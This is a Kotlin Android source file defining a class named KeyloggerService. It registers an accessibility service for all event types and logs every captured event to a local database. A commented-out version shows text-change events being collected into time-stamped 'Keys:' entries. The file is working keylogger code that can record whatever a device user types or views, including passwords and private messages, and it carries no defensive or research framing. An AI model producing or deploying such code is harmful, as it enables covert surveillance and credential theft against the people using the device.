package com.jackstoller.vigil

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.util.Date

class KeyloggerService : AccessibilityService() {

    private lateinit var db: EventLoggerDatabase

    override fun onServiceConnected() {
        super.onServiceConnected()

        db = EventLoggerDatabase(this)

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        }

        Log.d("VigilService", "Accessibility Service Connected!")
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        Log.d("VigilService", "Accessibility Event Captured. Logging to database.")
        db.insertEvent(event)
    }

//    override fun onAccessibilityEvent(event: AccessibilityEvent) {
//        Log.d("VigilService", """
//                    EventType: ${AccessibilityEvent.eventTypeToString(event.eventType)}
//                    PackageName: ${event.packageName}
//                    ClassName: ${event.className}
//                    Text: ${event.text}
//                    ContentDescription: ${event.contentDescription}
//                    Source: ${event.source}
//                    Action: ${event.action}
//                    EventTime: ${event.eventTime}
//                    ItemCount: ${event.itemCount}
//                    CurrentItemIndex: ${event.currentItemIndex}
//                    FromIndex: ${event.fromIndex}
//                    ToIndex: ${event.toIndex}
//                    ScrollX: ${event.scrollX}
//                    ScrollY: ${event.scrollY}
//                    MaxScrollX: ${event.maxScrollX}
//                    MaxScrollY: ${event.maxScrollY}
//                    IsScrollable: ${event.isScrollable}
//                """.trimIndent())
//
//
////        Log.d("VigilService", "Captured AccessibilityEvent $eventType")
//
//        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
//            val currentTime = System.currentTimeMillis()
//            val text = event.text.toString()
//            if (currentTime - lastEventTime > 60000) {
//                eventList.add("Date: ${Date(lastEventTime)}, Keys: $text")
//                Log.d("VigilService", "Captured text: $text")
//
//            } else {
//                val lastEvent = eventList.removeAt(eventList.size - 1)
//                eventList.add("$lastEvent$text")
//            }
//            lastEventTime = currentTime
//        }
//    }

    override fun onInterrupt() {
        // Handle service interruption
    }

//    override fun onServiceConnected() {
//        val info = AccessibilityServiceInfo().apply {
//            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
//            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
//            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
//        }
//
//        Log.d("VigilService", "Accessibility Service Connected!")
//
//        serviceInfo = info
//    }
}